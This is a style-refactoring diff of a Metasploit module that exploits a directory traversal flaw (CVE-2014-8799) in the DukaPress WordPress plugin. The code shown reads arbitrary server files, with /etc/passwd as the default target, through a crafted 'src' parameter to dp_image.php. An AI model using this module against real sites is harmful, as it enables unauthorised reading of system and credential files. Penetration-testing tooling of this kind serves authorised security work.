@@ -9,33 +9,40 @@ class MetasploitModule < Msf::Auxiliary
   include Msf::Auxiliary::Scanner
 
   def initialize(info = {})
-    super(update_info(info,
-      'Name'           => 'WordPress DukaPress Plugin File Read Vulnerability',
-      'Description'    => %q{
-        This module exploits a directory traversal vulnerability in WordPress Plugin
-        "DukaPress" version <= 2.5.3, allowing to read arbitrary files with the
-        web server privileges.
-      },
-      'References'     =>
-        [
+    super(
+      update_info(
+        info,
+        'Name' => 'WordPress DukaPress Plugin File Read Vulnerability',
+        'Description' => %q{
+          This module exploits a directory traversal vulnerability in WordPress Plugin
+          "DukaPress" version <= 2.5.3, allowing to read arbitrary files with the
+          web server privileges.
+        },
+        'References' => [
           ['EDB', '35346'],
           ['CVE', '2014-8799'],
           ['WPVDB', '7731'],
           ['OSVDB', '115130']
         ],
-      'Author'         =>
-        [
+        'Author' => [
           'Kacper Szurek', # Vulnerability discovery
           'Roberto Soares Espreto <robertoespreto[at]gmail.com>' # Metasploit module
         ],
-      'License'        => MSF_LICENSE
-    ))
+        'License' => MSF_LICENSE,
+        'Notes' => {
+          'Reliability' => UNKNOWN_RELIABILITY,
+          'Stability' => UNKNOWN_STABILITY,
+          'SideEffects' => UNKNOWN_SIDE_EFFECTS
+        }
+      )
+    )
 
     register_options(
       [
         OptString.new('FILEPATH', [true, 'The path to the file to read', '/etc/passwd']),
         OptInt.new('DEPTH', [ true, 'Traversal Depth (to reach the root folder)', 7 ])
-      ])
+      ]
+    )
   end
 
   def check
@@ -49,7 +56,7 @@ class MetasploitModule < Msf::Auxiliary
 
     res = send_request_cgi({
       'method' => 'GET',
-      'uri'    => normalize_uri(wordpress_url_plugins, 'dukapress', 'lib', 'dp_image.php'),
+      'uri' => normalize_uri(wordpress_url_plugins, 'dukapress', 'lib', 'dp_image.php'),
       'vars_get' =>
         {
           'src' => "#{traversal}#{filename}"
